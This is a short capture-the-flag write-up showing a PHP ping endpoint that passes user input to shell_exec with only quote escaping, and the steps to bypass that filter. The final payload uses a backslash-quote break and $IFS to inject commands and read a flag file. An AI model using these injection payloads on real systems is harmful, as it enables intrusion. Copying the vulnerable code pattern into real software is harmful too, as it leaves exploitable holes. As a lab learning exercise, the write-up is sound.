# Command Injection with filter

### The backend replaces single quote (') with (\\')

```
<?php
    if (isset($_GET['ip'])) {
        $ip = $_GET['ip'];
        if (strpos($ip, " ")) {
            die("Spaces not allowed in the IP!");
        }
        $ip = str_replace("'", "\\'", $ip);
        $cmd = "ping -c1 -t1 '$ip'";
        if ($_GET['debug']) { echo "$cmd\n"; }
        echo shell_exec($cmd);
        die();
    }
?>
```

The code above was running on the site. No spaces, no quotes. HMMMM!

Took some time to figure out how bash would bypass \\' and accept quotes since without breaking the quotes it would be impossible to run multiple commands here.



### Intended background command

ping -c1 -t1 '127.0.0.1';'\<command injection>'

### Failure payload 1

```
http://localhost/?ip=127.0.0.1
```

Background statement becomes: ping -c1 -t1 '127.0.0.1'

First injection tried: ';'ls

Background statement becomes: ping -c1 -t1 '127.0.0.1';'ls'

### Failure payload 2

Injection: \&apos".";ls"."\&apos%0A

Then I figured out that when I provide \\' it is parsed as \\\\'

A non-quoted backslash,\ , is used as an escape character in Bash. A backslash escapes the next character from being interpreted by the shell

So, since \\' is not what we want, when we do \\\\' the literal value becomes just '



Mini failure: I even tried PHP to join two statements but failed to notice that shell\_exec would eventually run commands as bash. My bad.

### Final Payload

```
http://localhost/?ip=127.0.0.1\%27;cat$IFS/flag.txt;\
```

Not EZ PZ at all this time. Took a lot of background reading of bash.
